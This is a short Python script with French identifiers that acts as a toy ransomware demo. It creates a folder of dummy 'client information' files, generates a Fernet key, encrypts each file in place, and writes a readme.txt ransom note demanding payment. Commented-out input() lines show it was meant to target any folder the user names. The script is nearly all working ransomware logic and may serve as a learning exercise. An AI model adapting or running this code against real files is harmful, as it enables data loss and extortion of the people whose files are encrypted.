
import os 
def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory
def write_file(path,data):
    file =open(path,'w')
    file.write(data)
    return file
# path=input("donnez le path")
def remplir_repertoire(directory):
    with open(str(directory)+'/'+'file1.txt','w') as file:

        file.write("ce contenu est tres important ")
        file.write("les  informations de nos chers clients")

    with open(str(directory)+'/'+'file2.txt','w') as file:
         file.write("ce contenu est tres important ")
         file.write("les  informations de nos chers clients")
pwd=create_directory('files')

remplir_repertoire(pwd)
from cryptography.fernet import Fernet
items=os.listdir(pwd)
print(items)

def generation_clef():
    clef=Fernet.generate_key()
    with open("clef.key",'wb') as key_file:
        key_file.write(clef)

def lire_clef():
    return open('clef.key','rb').read()
def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items:
        with open(item,'rb') as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,'wb') as File:
            File.write(encrypted_data)
path=[str(pwd)+'/'+item for item in items]
# path=input("donner le path du dossier ")
generation_clef()
clef=lire_clef()
chiffrement(path,clef)
with open(str(pwd)+'/'+'readme.txt','w') as file:
    file.write('vous etes amenes a payer la rancon')

